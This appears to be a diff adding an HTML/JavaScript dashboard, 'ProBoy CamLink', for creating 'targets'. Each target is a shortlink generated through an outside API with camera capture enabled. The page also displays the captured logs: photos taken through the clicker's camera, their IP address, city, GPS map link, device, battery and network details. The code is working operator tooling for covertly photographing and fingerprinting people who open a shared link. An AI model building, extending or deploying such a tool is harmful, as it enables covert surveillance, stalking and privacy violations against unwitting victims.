@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>ProBoy · Camera Target Manager</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    :root {
+      --bg-deep: #03050b;
+      --card-bg: rgba(12, 18, 32, 0.72);
+      --glass-border: rgba(255, 255, 255, 0.06);
+      --glass-highlight: rgba(255, 255, 255, 0.03);
+      --cyan: #00f2ff;
+      --cyan-glow: 0 0 12px rgba(0, 242, 255, 0.4);
+      --green: #7effcb;
+      --pink: #ff4fc4;
+      --gold: #ffd966;
+      --purple: #b87cff;
+      --text-main: #f0f3ff;
+      --text-dim: #a2afd0;
+      --radius-xl: 32px;
+      --radius-lg: 24px;
+      --radius-md: 18px;
+      --transition: all 0.4s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+    }
+
+    body {
+      background: radial-gradient(circle at 10% 0%, rgba(0, 242, 255, 0.08), transparent 45%),
+                  radial-gradient(circle at 90% 100%, rgba(255, 79, 196, 0.08), transparent 50%),
+                  linear-gradient(145deg, #03050b 0%, #0a0f1c 100%);
+      font-family: 'Inter', system-ui, 'Segoe UI', -apple-system, sans-serif;
+      color: var(--text-main);
+      min-height: 100vh;
+      padding: 36px 24px 80px;
+      background-attachment: fixed;
+    }
+
+    /* noise texture for depth */
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.7' numOctaves='1' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.018'/%3E%3C/svg%3E");
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .container {
+      max-width: 1440px;
+      margin: 0 auto;
+      position: relative;
+      z-index: 2;
+    }
+
+    /* header with ProBoy */
+    .brand {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      margin-bottom: 48px;
+      gap: 16px;
+    }
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      font-size: 2.3rem;
+      font-weight: 850;
+      background: linear-gradient(135deg, var(--cyan), var(--green), var(--gold), var(--pink));
+      background-size: 280% auto;
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      letter-spacing: -0.5px;
+      animation: gradientFlow 7s ease infinite;
+    }
+    .logo-img {
+      width: 48px;
+      height: 48px;
+      object-fit: contain;
+      filter: drop-shadow(0 0 6px rgba(0,242,255,0.3));
+    }
+    .logo i {
+      background: none;
+      -webkit-background-clip: unset;
+      color: var(--cyan);
+      filter: drop-shadow(0 0 8px var(--cyan));
+    }
+    @keyframes gradientFlow {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    .tagline {
+      color: var(--text-dim);
+      font-size: 0.85rem;
+      background: rgba(0,242,255,0.08);
+      padding: 6px 14px;
+      border-radius: 60px;
+      border: 1px solid rgba(0,242,255,0.2);
+    }
+
+    /* dashboard grid */
+    .dashboard {
+      display: grid;
+      grid-template-columns: 1fr 1.3fr;
+      gap: 32px;
+    }
+
+    /* premium glass card */
+    .glass-card {
+      background: var(--card-bg);
+      backdrop-filter: blur(16px);
+      border: 1px solid var(--glass-border);
+      border-radius: var(--radius-xl);
+      padding: 32px 30px;
+      transition: var(--transition);
+      box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+      position: relative;
+      overflow: hidden;
+    }
+    .glass-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(circle at 30% 20%, rgba(255,255,255,0.03), transparent 70%);
+      pointer-events: none;
+    }
+    .glass-card:hover {
+      border-color: rgba(0, 242, 255, 0.35);
+      transform: translateY(-6px);
+      box-shadow: 0 32px 60px -12px rgba(0, 242, 255, 0.18);
+    }
+
+    h2 {
+      font-size: 1.8rem;
+      font-weight: 700;
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      background: linear-gradient(125deg, #fff, var(--cyan));
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+
+    .field {
+      margin-bottom: 26px;
+    }
+    label {
+      display: block;
+      font-weight: 600;
+      margin-bottom: 10px;
+      color: var(--text-dim);
+      font-size: 0.9rem;
+      letter-spacing: 0.3px;
+    }
+    input {
+      width: 100%;
+      background: rgba(5, 8, 18, 0.7);
+      border: 1px solid rgba(255,255,255,0.12);
+      border-radius: 20px;
+      padding: 14px 18px;
+      font-size: 1rem;
+      color: white;
+      transition: var(--transition);
+    }
+    input:focus {
+      outline: none;
+      border-color: var(--cyan);
+      box-shadow: 0 0 0 4px rgba(0, 242, 255, 0.12);
+      background: rgba(0,0,0,0.6);
+    }
+
+    button {
+      background: linear-gradient(110deg, var(--cyan), #1bb4d9);
+      border: none;
+      border-radius: 50px;
+      padding: 14px 28px;
+      font-weight: 800;
+      font-size: 1rem;
+      color: #031014;
+      cursor: pointer;
+      transition: var(--transition);
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+      box-shadow: 0 4px 14px rgba(0, 242, 255, 0.3);
+    }
+    button:hover {
+      transform: translateY(-4px);
+      box-shadow: 0 14px 30px rgba(0, 242, 255, 0.45);
+      filter: brightness(1.03);
+    }
+
+    /* target list styling */
+    .targets-list {
+      margin-top: 28px;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+      max-height: 460px;
+      overflow-y: auto;
+      padding-right: 6px;
+    }
+    .targets-list::-webkit-scrollbar {
+      width: 6px;
+    }
+    .targets-list::-webkit-scrollbar-track {
+      background: rgba(255,255,255,0.05);
+      border-radius: 10px;
+    }
+    .targets-list::-webkit-scrollbar-thumb {
+      background: var(--cyan);
+      border-radius: 10px;
+    }
+
+    .target-card {
+      background: rgba(8, 12, 24, 0.65);
+      backdrop-filter: blur(8px);
+      border-radius: 24px;
+      padding: 18px 22px;
+      cursor: pointer;
+      transition: var(--transition);
+      border: 1px solid rgba(255,255,255,0.05);
+    }
+    .target-card:hover {
+      background: rgba(0, 242, 255, 0.08);
+      border-color: rgba(0, 242, 255, 0.5);
+      transform: translateX(8px);
+    }
+    .target-title {
+      font-size: 1.2rem;
+      font-weight: 700;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+    .target-url-text {
+      font-size: 0.75rem;
+      font-family: monospace;
+      color: var(--text-dim);
+      word-break: break-all;
+      margin-top: 10px;
+      opacity: 0.8;
+    }
+    .date-badge {
+      font-size: 0.7rem;
+      background: rgba(0,0,0,0.5);
+      padding: 5px 12px;
+      border-radius: 40px;
+      font-weight: normal;
+    }
+
+    /* capture panel */
+    .capture-panel {
+      margin-top: 32px;
+      background: rgba(0, 0, 0, 0.28);
+      border-radius: 28px;
+      padding: 22px;
+      border: 1px solid rgba(255,255,255,0.06);
+    }
+    .capture-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      margin-bottom: 20px;
+    }
+    .capture-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+      gap: 24px;
+    }
+    .capture-item {
+      background: rgba(6, 10, 20, 0.75);
+      backdrop-filter: blur(6px);
+      border-radius: 26px;
+      overflow: hidden;
+      border: 1px solid rgba(255,255,255,0.08);
+      transition: var(--transition);
+    }
+    .capture-item:hover {
+      transform: scale(1.02);
+      border-color: rgba(0, 242, 255, 0.4);
+      box-shadow: 0 18px 36px -12px rgba(0,0,0,0.5);
+    }
+    .capture-img {
+      width: 100%;
+      height: 190px;
+      object-fit: cover;
+      background: #0c1020;
+    }
+    .capture-details {
+      padding: 18px;
+    }
+    .info-row {
+      display: flex;
+      gap: 12px;
+      margin: 9px 0;
+      font-size: 0.8rem;
+      align-items: center;
+      flex-wrap: wrap;
+    }
+    .badge-cyan {
+      background: rgba(0, 242, 255, 0.15);
+      border-radius: 40px;
+      padding: 4px 12px;
+      font-size: 0.7rem;
+      font-weight: 600;
+      color: var(--cyan);
+    }
+    .loader {
+      display: inline-block;
+      width: 22px;
+      height: 22px;
+      border: 2px solid rgba(255,255,255,0.2);
+      border-top-color: var(--cyan);
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .empty-message {
+      text-align: center;
+      padding: 48px 20px;
+      color: var(--text-dim);
+    }
+
+    @media (max-width: 880px) {
+      .dashboard { grid-template-columns: 1fr; }
+      body { padding: 20px 16px; }
+      .glass-card { padding: 24px 20px; }
+      .logo { font-size: 1.9rem; }
+      .logo-img { width: 40px; height: 40px; }
+    }
+
+    /* extra glow */
+    .glow-border {
+      box-shadow: 0 0 8px rgba(0,242,255,0.1);
+    }
+    i.fa, i.far, i.fas {
+      filter: drop-shadow(0 0 4px rgba(0,242,255,0.3));
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+  <div class="brand">
+    <div class="logo">
+      <img class="logo-img" src="https://ProBoy.vercel.app/img.png" alt="ProBoy Logo" onerror="this.style.display='none'">
+      <span><i class="fas fa-crown"></i> ProBoy <span style="font-size: 1rem; background: none; -webkit-text-fill-color: unset; color: var(--cyan);">✦ CamLink</span></span>
+    </div>
+    <div class="tagline"><i class="fas fa-camera"></i> camera capture · smart shortlinks</div>
+  </div>
+
+  <div class="dashboard">
+    <!-- Left: Create Target -->
+    <div class="glass-card">
+      <h2><i class="fas fa-plus-circle"></i> Create Target</h2>
+      <p style="color: var(--text-dim); margin-bottom: 24px;">Generate a short URL with camera & device fingerprinting</p>
+      <div class="field">
+        <label><i class="fas fa-tag"></i> Target name</label>
+        <input type="text" id="targetName" placeholder="e.g., Summer Sale" autocomplete="off">
+      </div>
+      <div class="field">
+        <label><i class="fas fa-link"></i> Destination URL</label>
+        <input type="text" id="longUrl" placeholder="https://your-link.com/page">
+      </div>
+      <button id="createBtn"><i class="fas fa-camera"></i> Generate Shortlink</button>
+      <div id="createMessage" style="margin-top: 20px; font-size: 0.85rem;"></div>
+    </div>
+
+    <!-- Right: My Targets + Captures -->
+    <div class="glass-card">
+      <h2><i class="fas fa-bullseye"></i> My Targets</h2>
+      <p style="color: var(--text-dim); margin-bottom: 8px;">Click any target → view all captured logs</p>
+      <div id="targetsContainer" class="targets-list">
+        <div class="empty-message"><span class="loader"></span> Loading your targets...</div>
+      </div>
+
+      <div id="captureArea" style="display: none;" class="capture-panel">
+        <div class="capture-header">
+          <h3 style="font-size: 1.3rem; display: flex; gap: 8px;"><i class="fas fa-database"></i> Captured Data</h3>
+          <span id="selectedTargetName" class="badge-cyan"></span>
+        </div>
+        <div id="captureList" class="capture-grid"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ProBoy Ad Script Loader (external, you can update this file later) -->
+<script src="https://proboy.vercel.app/ProBoy-AD.js" async defer></script>
+
+<script>
+  // ---------- Device ID (persistent per browser) ----------
+  function getDeviceId() {
+    let device = localStorage.getItem('proboy_device_id');
+    if (!device) {
+      device = crypto.randomUUID ? crypto.randomUUID() : 'pb_' + Date.now() + '_' + Math.random().toString(36);
+      localStorage.setItem('proboy_device_id', device);
+    }
+    return device;
+  }
+  const DEVICE_ID = getDeviceId();
+
+  // Storage helpers
+  function loadTargets() {
+    const raw = localStorage.getItem(`proboy_targets_${DEVICE_ID}`);
+    return raw ? JSON.parse(raw) : [];
+  }
+  function saveTargets(targets) {
+    localStorage.setItem(`proboy_targets_${DEVICE_ID}`, JSON.stringify(targets));
+  }
+
+  // API: create camera shortlink
+  async function createCameraShortlink(longUrl, randomPhone) {
+    const payload = {
+      longUrl: longUrl,
+      phoneNumber: randomPhone,
+      captureCamera: true,
+      captureLocation: false
+    };
+    const res = await fetch('https://saqibveo1.vercel.app/api/shorten', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    const data = await res.json();
+    if (!res.ok || !data.success) throw new Error(data.message || 'API error');
+    return data.shortUrl;
+  }
+
+  // API: fetch captures by phone
+  async function fetchCapturesByPhone(phone) {
+    const res = await fetch(`https://saqibveo1.vercel.app/api/shorten?phoneNumber=${encodeURIComponent(phone)}`);
+    const data = await res.json();
+    if (!res.ok) throw new Error(data.message || 'Fetch failed');
+    return data.logs || [];
+  }
+
+  // Render targets list
+  async function renderTargets() {
+    const container = document.getElementById('targetsContainer');
+    const targets = loadTargets();
+    if (!targets.length) {
+      container.innerHTML = `<div class="empty-message"><i class="fas fa-info-circle"></i> No targets yet. Create your first one.</div>`;
+      return;
+    }
+    targets.sort((a,b) => new Date(b.createdAt) - new Date(a.createdAt));
+    container.innerHTML = targets.map(t => `
+      <div class="target-card" data-phone="${t.randomPhone}" data-name="${escapeHtml(t.targetName)}">
+        <div class="target-title">
+          <span><i class="fas fa-crosshairs"></i> ${escapeHtml(t.targetName)}</span>
+          <span class="date-badge">${new Date(t.createdAt).toLocaleString()}</span>
+        </div>
+        <div class="target-url-text">🔗 ${escapeHtml(t.shortUrl)}</div>
+      </div>
+    `).join('');
+
+    document.querySelectorAll('.target-card').forEach(el => {
+      el.addEventListener('click', () => {
+        const phone = el.dataset.phone;
+        const name = el.dataset.name;
+        showCaptures(phone, name);
+      });
+    });
+  }
+
+  // Show captures for selected target
+  async function showCaptures(phone, targetName) {
+    const area = document.getElementById('captureArea');
+    const listDiv = document.getElementById('captureList');
+    const selectedSpan = document.getElementById('selectedTargetName');
+    area.style.display = 'block';
+    selectedSpan.innerText = targetName;
+    listDiv.innerHTML = `<div style="grid-column:1/-1; text-align:center;"><span class="loader"></span> Fetching camera logs...</div>`;
+
+    try {
+      const logs = await fetchCapturesByPhone(phone);
+      if (!logs.length) {
+        listDiv.innerHTML = `<div class="empty-message" style="grid-column:1/-1;">📭 No captures yet. Share your shortlink.</div>`;
+        return;
+      }
+      listDiv.innerHTML = logs.map(log => {
+        const imgSrc = log.captured_image || '';
+        const time = new Date(log.created_at).toLocaleString('en-PK');
+        const ip = log.ip_address || 'Unknown';
+        const location = log.city || log.location_name || 'Unknown';
+        const os = log.os || log.device_type || 'Unknown';
+        const browser = log.browser || 'Unknown';
+        const battery = log.battery_level !== undefined ? Math.round(log.battery_level * 100) + '%' : 'N/A';
+        const charging = log.is_charging ? '⚡ Charging' : '🔋 Not Charging';
+        const memory = log.device_memory ? log.device_memory + ' GB' : 'N/A';
+        const network = log.network_type || 'N/A';
+        let mapLink = '';
+        if (log.latitude && log.longitude) {
+          mapLink = `<a href="https://www.google.com/maps?q=${log.latitude},${log.longitude}" target="_blank" style="color: var(--cyan);"><i class="fas fa-map-marker-alt"></i> Map</a>`;
+        }
+        return `
+          <div class="capture-item">
+            ${imgSrc ? `<img class="capture-img" src="${imgSrc}" alt="camera capture" onerror="this.src='https://placehold.co/600x400/0a0e1c/00f2ff?text=Image+failed'">` : `<div style="height:190px; background:#0c1020; display:flex; align-items:center; justify-content:center;"><i class="fas fa-camera-slash" style="font-size:3rem; opacity:0.5;"></i></div>`}
+            <div class="capture-details">
+              <div class="info-row"><span class="badge-cyan">${escapeHtml(log.short_code || 'N/A')}</span> <span>${time}</span></div>
+              <div class="info-row"><i class="fas fa-map-pin"></i> ${escapeHtml(location)}</div>
+              <div class="info-row"><i class="fas fa-network-wired"></i> ${escapeHtml(ip)}</div>
+              <div class="info-row"><i class="fab fa-windows"></i> ${escapeHtml(os)} · ${escapeHtml(browser)}</div>
+              <div class="info-row"><i class="fas fa-battery-full"></i> ${battery} ${charging} | RAM ${memory} | ${network}</div>
+              ${mapLink ? `<div class="info-row">${mapLink}</div>` : ''}
+            </div>
+          </div>
+        `;
+      }).join('');
+    } catch (err) {
+      listDiv.innerHTML = `<div class="empty-message" style="grid-column:1/-1; color:#ff8a5c;">❌ ${escapeHtml(err.message)}</div>`;
+    }
+  }
+
+  // Create new target handler
+  document.getElementById('createBtn').addEventListener('click', async () => {
+    const targetName = document.getElementById('targetName').value.trim();
+    let longUrl = document.getElementById('longUrl').value.trim();
+    const msgDiv = document.getElementById('createMessage');
+    if (!targetName || !longUrl) {
+      msgDiv.innerHTML = '<span style="color:#ff8a5c;">⚠️ Both fields required</span>';
+      return;
+    }
+    if (!/^https?:\/\//i.test(longUrl)) longUrl = 'https://' + longUrl;
+    msgDiv.innerHTML = '<span class="loader"></span> Creating secure shortlink...';
+    try {
+      const randomPhone = '92' + Math.floor(300000000 + Math.random() * 900000000);
+      const shortUrl = await createCameraShortlink(longUrl, randomPhone);
+      const targets = loadTargets();
+      if (targets.some(t => t.targetName === targetName)) throw new Error('Target name already exists');
+      targets.push({
+        targetName, longUrl, shortUrl, randomPhone,
+        createdAt: new Date().toISOString()
+      });
+      saveTargets(targets);
+      msgDiv.innerHTML = `<span style="color: var(--green);">✅ Created: <a href="${shortUrl}" target="_blank" style="color: var(--cyan); font-weight: bold;">${shortUrl}</a></span>`;
+      document.getElementById('targetName').value = '';
+      document.getElementById('longUrl').value = '';
+      renderTargets();
+    } catch (err) {
+      msgDiv.innerHTML = `<span style="color: #ff4fc4;">❌ ${err.message}</span>`;
+    }
+  });
+
+  function escapeHtml(str) {
+    if (!str) return '';
+    return str.replace(/[&<>]/g, function(m) {
+      if (m === '&') return '&amp;';
+      if (m === '<') return '&lt;';
+      if (m === '>') return '&gt;';
+      return m;
+    });
+  }
+
+  renderTargets();
+</script>
+</body>
+</html>
